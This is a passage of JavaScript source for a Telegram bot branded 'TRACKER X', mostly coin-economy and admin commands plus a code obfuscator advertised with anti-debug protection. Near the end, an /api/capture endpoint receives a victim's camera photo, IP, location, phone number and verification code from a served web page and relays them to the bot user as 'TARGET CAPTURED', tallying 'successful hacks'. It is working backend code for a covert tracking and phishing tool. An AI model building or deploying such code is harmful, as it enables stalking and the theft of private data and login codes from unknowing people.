${result.obfuscated.length > 3500 ? '\n⚠️ Code truncated! Use /save to get full version.' : ''}

<i>Code is protected with anti-debug features!</i>
      `), { parse_mode: "HTML" });
      
      if (result.obfuscated.length > 3500) {
        const buffer = Buffer.from(result.obfuscated, 'utf-8');
        await ctx.replyWithDocument({ source: buffer, filename: 'obfuscated_code.js' });
      }
    } else {
      await ctx.reply(`❌ Obfuscation failed: ${result.error}`);
    }
    return;
  }
  
  // Handle Minify
  if (user?.waitingForMinify) {
    user.waitingForMinify = false;
    users.set(ctx.from.id, user);
    
    const code = msg.text;
    if (code.length > 10000) return ctx.reply("❌ Code too long! Maximum 10,000 characters.");
    
    await ctx.reply("🗜️ **Minifying your code...**", { parse_mode: "Markdown" });
    const result = minifyCode(code);
    
    if (result.success) {
      await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  ✅ MINIFICATION COMPLETE!              ║
╚══════════════════════════════════════════╝

<b>📊 Statistics:</b>
• Original Size: ${code.length} chars
• Minified Size: ${result.minified.length} chars
• Reduction: ${Math.round((1 - result.minified.length / code.length) * 100)}%

<b>🗜️ Minified Code:</b>
<code>${result.minified.substring(0, 3500)}${result.minified.length > 3500 ? '...' : ''}</code>
      `), { parse_mode: "HTML" });
      
      if (result.minified.length > 3500) {
        const buffer = Buffer.from(result.minified, 'utf-8');
        await ctx.replyWithDocument({ source: buffer, filename: 'minified_code.js' });
      }
    } else {
      await ctx.reply(`❌ Minification failed: ${result.error}`);
    }
    return;
  }
  
  // Handle Validate
  if (user?.waitingForValidate) {
    user.waitingForValidate = false;
    users.set(ctx.from.id, user);
    
    const code = msg.text;
    await ctx.reply("✅ **Validating your code...**", { parse_mode: "Markdown" });
    const result = validateCode(code);
    
    if (result.valid) {
      await ctx.reply(`✅ Code is valid! No syntax errors found.`);
    } else {
      await ctx.reply(`❌ Syntax Error:\n<code>${result.error}</code>`, { parse_mode: "HTML" });
    }
    return;
  }
  
  // Owner reply system
  if (chatId === OWNER_ID && msg.reply_to_message) {
    const replyText = msg.reply_to_message.text || msg.reply_to_message.caption || "";
    const match = replyText.match(/🆔 ID: (\d+)/);
    if (match) {
      const userId = parseInt(match[1]);
      try {
        await ctx.telegram.sendMessage(userId, formatMessage(`
💬 <b>Reply from Developer:</b>

${msg.text}

<i>🔐 This is a secure message</i>
        `), { parse_mode: "HTML" });
        await ctx.reply("✅ Reply sent!");
      } catch (err) {
        await ctx.reply("❌ Failed to send reply.");
      }
      return;
    }
  }
  
  // User to owner chat
  if (activeChats.has(chatId)) {
    try {
      await ctx.telegram.sendMessage(OWNER_ID, formatMessage(`
📨 <b>New Message from User</b>

👤 <b>Name:</b> ${msg.from.first_name}
🔗 <b>Username:</b> @${msg.from.username || 'None'}
🆔 <b>ID:</b> ${chatId}

💬 <b>Message:</b>
${msg.text}

✏️ <i>Reply to this message to respond</i>
      `), { parse_mode: "HTML" });
      await ctx.reply("✅ Message sent to developer!");
    } catch (err) {
      await ctx.reply("❌ Failed to send message.");
    }
  }
  
  addXP(chatId, 1);
});

// ========== SIMPLE COMMANDS ==========
bot.command("balance", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(`💰 Your balance: ${user.coins} coins\n🏦 Bank: ${user.bank} coins`);
});

bot.command("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && (now - user.lastDaily) < dayInMs) {
    const remaining = dayInMs - (now - user.lastDaily);
    const hours = Math.floor(remaining / 3600000);
    return ctx.reply(`⏰ Already claimed! Come back in ${hours} hours.`);
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && (now - user.lastDaily) < dayInMs * 2) {
    streak++;
  } else {
    streak = 1;
  }
  
  const bonus = Math.min(streak, 10);
  const reward = DAILY_REWARD + bonus;
  
  addCoins(ctx.from.id, reward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(`🎁 Daily reward: +${reward} coins!\n🔥 Streak: ${streak} days\n💰 New balance: ${user.coins + reward}`);
});

bot.command("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const remaining = 3600000 - (now - lastWork);
    const minutes = Math.ceil(remaining / 60000);
    return ctx.reply(`⏰ Rest for ${minutes} minutes before working again.`);
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopper"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  
  await ctx.reply(`💼 Worked as ${job}! +${reward} coins!\n💰 New balance: ${users.get(userId).coins}`);
});

bot.command("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(formatMessage(`
👤 <b>PROFILE</b>

Name: ${ctx.from.first_name}
ID: <code>${ctx.from.id}</code>

💰 Coins: ${user.coins}
👥 Referrals: ${user.referrals}
🔧 Hacks Used: ${user.usedHacks}
🎮 Games: ${user.gamesWon}W / ${user.gamesLost}L
📅 Joined: ${new Date(user.joinDate).toLocaleDateString()}
  `), { parse_mode: "HTML" });
});

bot.command("stats", async (ctx) => {
  await ctx.reply(formatMessage(`
📊 <b>BOT STATS</b>

👥 Users: ${botStats.totalUsers}
🟢 Online: ${activeTokens.size}
💰 Total Coins: ${botStats.totalCoinsGiven}
🎯 Hacks: ${botStats.totalHacksUsed}
👥 Referrals: ${botStats.totalReferrals}
🔒 Obfuscations: ${botStats.totalObfuscations}
  `), { parse_mode: "HTML" });
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ You are not authorized to use admin commands!");
  }
  
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  👑 ADMIN PANEL - TRACKER X v3.0       ║
╚══════════════════════════════════════════╝

<b>💰 ECONOMY CONTROL</b>
/addcoins @user amount - Add coins
/removecoins @user amount - Remove coins
/setcoins @user amount - Set coins

<b>🎁 REDEEM CODES</b>
/gencode coins uses hours - Generate code
/codes - List all codes
/delcode CODE - Delete code

<b>📢 BROADCAST</b>
/broadcast message - Send to all users

<b>📊 STATISTICS</b>
/botstats - Full bot stats
/users - List all users
/userinfo @user - User details

<b>⚙️ SYSTEM</b>
/backup - Backup database
/restart - Restart bot
/maintenance on/off - Maintenance mode

<b>🚫 MODERATION</b>
/blacklist @user - Ban user
/whitelist @user - Unban user
/blacklisted - List banned users

<i>👑 Owner ID: ${OWNER_ID}</i>
  `), { parse_mode: "HTML" });
});

// Add Coins Command
bot.command("addcoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply("❌ Usage: /addcoins @username amount\n\nExample: /addcoins @Mrddev 100");
  }
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  if (isNaN(amount) || amount <= 0) {
    return ctx.reply("❌ Amount must be a positive number!");
  }
  
  let targetId = null;
  let targetUser = null;
  
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        targetUser = user;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) {
    return ctx.reply(`❌ User @${username} not found!`);
  }
  
  targetUser.coins += amount;
  targetUser.totalEarned += amount;
  users.set(targetId, targetUser);
  botStats.totalCoinsGiven += amount;
  
  await ctx.reply(`✅ Added ${amount} coins to @${username}!\n💰 New balance: ${targetUser.coins} coins`);
  
  try {
    await ctx.telegram.sendMessage(targetId, `🎉 You received ${amount} coins from admin!\n💰 New balance: ${targetUser.coins} coins`);
  } catch(e) {}
});

// Remove Coins Command
bot.command("removecoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply("❌ Usage: /removecoins @username amount\n\nExample: /removecoins @Mrddev 50");
  }
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  if (isNaN(amount) || amount <= 0) {
    return ctx.reply("❌ Amount must be a positive number!");
  }
  
  let targetId = null;
  let targetUser = null;
  
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        targetUser = user;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) {
    return ctx.reply(`❌ User @${username} not found!`);
  }
  
  if (targetUser.coins < amount) {
    return ctx.reply(`❌ User @${username} only has ${targetUser.coins} coins!`);
  }
  
  targetUser.coins -= amount;
  targetUser.totalSpent += amount;
  users.set(targetId, targetUser);
  
  await ctx.reply(`✅ Removed ${amount} coins from @${username}!\n💰 New balance: ${targetUser.coins} coins`);
  
  try {
    await ctx.telegram.sendMessage(targetId, `⚠️ ${amount} coins were removed from your account by admin!\n💰 New balance: ${targetUser.coins} coins`);
  } catch(e) {}
});

// Set Coins Command
bot.command("setcoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply("❌ Usage: /setcoins @username amount\n\nExample: /setcoins @Mrddev 500");
  }
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  if (isNaN(amount) || amount < 0) {
    return ctx.reply("❌ Amount must be a valid number!");
  }
  
  let targetId = null;
  let targetUser = null;
  
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        targetUser = user;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) {
    return ctx.reply(`❌ User @${username} not found!`);
  }
  
  targetUser.coins = amount;
  users.set(targetId, targetUser);
  
  await ctx.reply(`✅ Set @${username}'s balance to ${amount} coins!`);
  
  try {
    await ctx.telegram.sendMessage(targetId, `💰 Admin set your balance to ${amount} coins!`);
  } catch(e) {}
});

// Generate Code Command
bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  const coins = parseInt(args[1]) || 50;
  const uses = parseInt(args[2]) || 10;
  const hours = parseInt(args[3]) || 24;
  
  const code = crypto.randomBytes(6).toString("hex").toUpperCase();
  
  redeemCodes.set(code, {
    coins: coins,
    usedBy: [],
    maxUses: uses,
    remainingUses: uses,
    createdBy: OWNER_ID,
    createdAt: Date.now(),
    expiresAt: Date.now() + (hours * 60 * 60 * 1000)
  });
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ✅ CODE GENERATED!     ║
╚══════════════════════════╝

🎁 <b>Code:</b> <code>${code}</code>
💰 <b>Coins:</b> ${coins}
🔄 <b>Max Uses:</b> ${uses}
⏱️ <b>Expires:</b> ${hours} hours

<i>Share this code with users!</i>
  `), { parse_mode: "HTML" });
});

// List Codes Command
bot.command("codes", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  if (redeemCodes.size === 0) {
    return ctx.reply("📋 No active redeem codes.");
  }
  
  let message = "📋 **ACTIVE REDEEM CODES**\n\n";
  
  for (const [code, data] of redeemCodes) {
    const expiresIn = Math.floor((data.expiresAt - Date.now()) / 3600000);
    message += `\`${code}\` - ${data.coins} coins - ${data.remainingUses} uses left - expires in ${expiresIn}h\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

// Delete Code Command
bot.command("delcode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /delcode CODE\n\nExample: /delcode ABC123");
  }
  
  const code = args[1].toUpperCase();
  
  if (redeemCodes.has(code)) {
    redeemCodes.delete(code);
    await ctx.reply(`✅ Code \`${code}\` deleted!`, { parse_mode: "Markdown" });
  } else {
    await ctx.reply(`❌ Code \`${code}\` not found!`, { parse_mode: "Markdown" });
  }
});

// Broadcast Command
bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply("❌ Usage: /broadcast message\n\nExample: /broadcast Hello everyone!");
  }
  
  await ctx.reply("📢 **Sending broadcast to all users...**", { parse_mode: "Markdown" });
  
  let success = 0;
  let failed = 0;
  
  for (const [userId, user] of users) {
    try {
      await ctx.telegram.sendMessage(userId, formatMessage(`
╔══════════════════════════╗
║  📢 ANNOUNCEMENT        ║
╚══════════════════════════╝

${message}

<i>— Admin Team</i>
      `), { parse_mode: "HTML" });
      success++;
    } catch(e) {
      failed++;
    }
  }
  
  await ctx.reply(`✅ Broadcast complete!\n\n📨 Sent: ${success} users\n❌ Failed: ${failed} users`);
});

// Bot Stats Command
bot.command("botstats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const uptime = Date.now() - botStats.startTime;
  const uptimeDays = Math.floor(uptime / 86400000);
  const uptimeHours = Math.floor((uptime % 86400000) / 3600000);
  const uptimeMinutes = Math.floor((uptime % 3600000) / 60000);
  
  const totalCoins = Array.from(users.values()).reduce((sum, u) => sum + u.coins, 0);
  const totalGames = Array.from(users.values()).reduce((sum, u) => sum + u.gamesPlayed, 0);
  const totalWins = Array.from(users.values()).reduce((sum, u) => sum + u.gamesWon, 0);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  📊 FULL BOT STATISTICS                ║
╚══════════════════════════════════════════╝

<b>🤖 BOT INFO:</b>
• Version: ${BOT_VERSION}
• Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m
• Total Users: ${botStats.totalUsers}
• Total Groups: ${botStats.totalGroups}

<b>💰 ECONOMY:</b>
• Total Coins Given: ${botStats.totalCoinsGiven}
• Total Coins in Circulation: ${totalCoins}
• Total Referrals: ${botStats.totalReferrals}
• Total Redeems: ${botStats.totalRedeems}

<b>🎮 GAMES:</b>
• Total Games Played: ${totalGames}
• Total Games Won: ${totalWins}
• Global Win Rate: ${totalGames > 0 ? ((totalWins / totalGames) * 100).toFixed(1) : 0}%

<b>📈 ACTIVITY:</b>
• Commands: ${botStats.totalCommands}
• Messages: ${botStats.totalMessages}
• Hacks Used: ${botStats.totalHacksUsed}
• Obfuscations: ${botStats.totalObfuscations || 0}

<b>🔗 REFERRAL SYSTEM:</b>
• Total Referrals: ${botStats.totalReferrals}
• Referral Reward: ${REFERRAL_REWARD} coins
  `), { parse_mode: "HTML" });
});

// List Users Command
bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  let message = "📋 **REGISTERED USERS**\n\n";
  let count = 0;
  
  for (const [id, user] of users) {
    count++;
    message += `${count}. ID: \`${id}\` - ${user.coins} coins - Lvl ${user.level}\n`;
    if (count >= 20) break;
  }
  
  message += `\nTotal: ${users.size} users`;
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

// User Info Command
bot.command("userinfo", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /userinfo @username\n\nExample: /userinfo @Mrddev");
  }
  
  const username = args[1].replace("@", "");
  let targetId = null;
  let targetUser = null;
  
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        targetUser = user;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetUser) {
    return ctx.reply(`❌ User @${username} not found!`);
  }
  
  const winRate = targetUser.gamesPlayed > 0 ? ((targetUser.gamesWon / targetUser.gamesPlayed) * 100).toFixed(1) : 0;
  
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  👤 USER INFORMATION                    ║
╚══════════════════════════════════════════╝

<b>📝 BASIC INFO:</b>
• ID: <code>${targetId}</code>
• Username: @${username}
• Joined: ${new Date(targetUser.joinDate).toLocaleDateString()}

<b>💰 ECONOMY:</b>
• Coins: ${targetUser.coins}
• Bank: ${targetUser.bank}
• Total Earned: ${targetUser.totalEarned}
• Total Spent: ${targetUser.totalSpent}

<b>📊 STATS:</b>
• Level: ${targetUser.level}
• Referrals: ${targetUser.referrals}
• Hacks Used: ${targetUser.usedHacks}
• Games: ${targetUser.gamesWon}W / ${targetUser.gamesLost}L
• Win Rate: ${winRate}%

<b>🏆 BADGES:</b>
${targetUser.badges.map(b => `• ${b}`).join('\n')}
  `), { parse_mode: "HTML" });
});

// Backup Command
bot.command("backup", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const backup = {
    timestamp: Date.now(),
    users: Array.from(users.entries()),
    redeemCodes: Array.from(redeemCodes.entries()),
    botStats: botStats,
    version: BOT_VERSION
  };
  
  const backupData = JSON.stringify(backup, null, 2);
  const buffer = Buffer.from(backupData, 'utf-8');
  
  await ctx.replyWithDocument({
    source: buffer,
    filename: `tracker_x_backup_${Date.now()}.json`
  });
  
  await ctx.reply("✅ Database backup created successfully!");
});

// Restart Command
bot.command("restart", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  await ctx.reply("🔄 Bot is restarting...");
  
  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

// Maintenance Mode Command
bot.command("maintenance", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  const mode = args[1];
  
  if (mode === "on") {
    maintenanceMode = true;
    await ctx.reply("🛠️ Maintenance mode ENABLED! Only admins can use the bot.");
  } else if (mode === "off") {
    maintenanceMode = false;
    await ctx.reply("✅ Maintenance mode DISABLED! Bot is back online.");
  } else {
    await ctx.reply(`⚙️ Maintenance mode is currently: ${maintenanceMode ? "ON" : "OFF"}\n\nUse /maintenance on or /maintenance off`);
  }
});

// Blacklist Command
bot.command("blacklist", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /blacklist @username\n\nExample: /blacklist @spammer");
  }
  
  const username = args[1].replace("@", "");
  let targetId = null;
  
  for (const [id] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) {
    return ctx.reply(`❌ User @${username} not found!`);
  }
  
  globalBlacklist.add(targetId);
  await ctx.reply(`🚫 User @${username} has been blacklisted from using the bot!`);
});

// Whitelist Command
bot.command("whitelist", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /whitelist @username\n\nExample: /whitelist @user");
  }
  
  const username = args[1].replace("@", "");
  let targetId = null;
  
  for (const [id] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) {
    return ctx.reply(`❌ User @${username} not found!`);
  }
  
  globalBlacklist.delete(targetId);
  await ctx.reply(`✅ User @${username} has been whitelisted!`);
});

// Blacklisted Command
bot.command("blacklisted", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Only the bot owner can use this command!");
  }
  
  if (globalBlacklist.size === 0) {
    return ctx.reply("📋 No users are blacklisted.");
  }
  
  let message = "🚫 **BLACKLISTED USERS**\n\n";
  let count = 0;
  
  for (const id of globalBlacklist) {
    count++;
    message += `${count}. ID: \`${id}\`\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

// ========== BACK BUTTONS ==========
bot.action("main_back", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════════════╗
║     🔱 TRACKER X v3.0           ║
║     ⚡ COMPLETE EDITION         ║
╚══════════════════════════════════╝

💰 <b>Balance:</b> ${user.coins} coins
📊 <b>Level:</b> ${user.level}
👥 <b>Referrals:</b> ${user.referrals}

🎯 <b>Select a module below</b>
  `), { parse_mode: "HTML", ...mainMenu(ctx) });
});

// ========== API ENDPOINT ==========
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location, number, country, code, userAgent, screenSize } = req.body;
    
    if (!token || !activeTokens.has(token)) {
      return res.status(400).json({ error: "Invalid token" });
    }
    
    const tokenData = activeTokens.get(token);
    
    if (image) {
      const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(tokenData.chatId, { source: buffer }, {
        caption: formatMessage(`
╔══════════════════════════╗
║  📸 TARGET CAPTURED!    ║
╚══════════════════════════╝

📱 Number: ${number || "Unknown"}
🌍 Country: ${country || "Unknown"}
🌐 IP: ${ip || "Unknown"}
📍 Location: ${location || "Unknown"}
🔑 Code: ${code || "Unknown"}
💻 User Agent: ${userAgent || "Unknown"}
📱 Screen: ${screenSize || "Unknown"}
🕐 Time: ${new Date().toLocaleString()}

<i>🔐 Target captured successfully!</i>
        `),
        parse_mode: "HTML"
      });
    } else {
      await bot.telegram.sendMessage(tokenData.chatId, formatMessage(`
╔══════════════════════════╗
║  📍 LOCATION TRACKED!   ║
╚══════════════════════════╝

🌐 IP: ${ip || "Unknown"}
📍 Location: ${location || "Unknown"}
📱 Number: ${number || "Unknown"}
🌍 Country: ${country || "Unknown"}
🕐 Time: ${new Date().toLocaleString()}
      `), { parse_mode: "HTML" });
    }
    
    const user = users.get(tokenData.userId);
    if (user) {
      user.successfulHacks = (user.successfulHacks || 0) + 1;
      users.set(tokenData.userId, user);
    }
    
    activeTokens.delete(token);
    res.json({ status: "success" });
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ========== SERVE FRONTEND ==========
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

bot.launch().then(() => {
  console.log(`🤖 Bot running!`);
  console.log(`🔱 TRACKER X v${BOT_VERSION} is LIVE!`);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
